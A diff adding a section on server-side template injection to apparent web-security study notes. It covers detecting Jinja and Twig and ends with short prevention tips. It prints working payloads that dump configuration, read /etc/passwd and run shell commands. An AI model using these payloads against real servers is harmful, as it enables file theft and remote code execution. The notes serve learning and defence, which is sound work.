@@ -77,6 +77,57 @@ https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Preve
  **SSTI: Server side template injection**
 Exploiting templating engines and server-side templates to generate responses, ex. HTML content dynamically. 
 
+- Template engines: Software that combines pre-defined templates with dynamically generated data. Engine examples: Jinja=python/flask/django and Twig
+- SSTI occurs when the attack can inject code into the template via a template parameter, which is later rendered on the server. This might make the server execute the code we injected.
+
+First step i checking if it is vulnerable or not, and then check what template engine it is. We have a payload map which can help us deduce this:
+![[Pasted image 20260507050724.png]]
+
+Once we know the type of engine, we have more information on how to exploit it. If it is **Jinja** (python based) we can do: 
+Dump info:
+```python
+{{ config.items() }}
+
+
+{{ self.__init__.__globals__.__builtins__ }}
+
+```
+
+Read files:
+```python
+{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
+```
+
+Gain RCE:
+```python
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+```
+
+**Exploiting Twig(PHP based engine):**
+Info dump:
+```php
+{{ _self }}
+```
+
+Read files:
+```php
+{{ "/etc/passwd"|file_excerpt(1,-1) }}
+```
+
+RCE:
+```php
+{{ ['id'] | filter('system') }}
+```
+
+Exploiting SSTI is much about understanding the engine syntax in the system we want to hack, read the doc or check out: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md for more details. 
+
+Other tools that help automate this process: https://github.com/vladko312/SSTImap 
+
+
+**Preventing SSTI:**
+- User input should never be passed to the template engines rendering function in the template parameter. 
+- Remove dangerous functions from the engine which we do not need. 
+
 **SSI: Server side includes injection**
 Similar to SSTI, can be used to generate html response from the server and include additional content dynamically. 
 
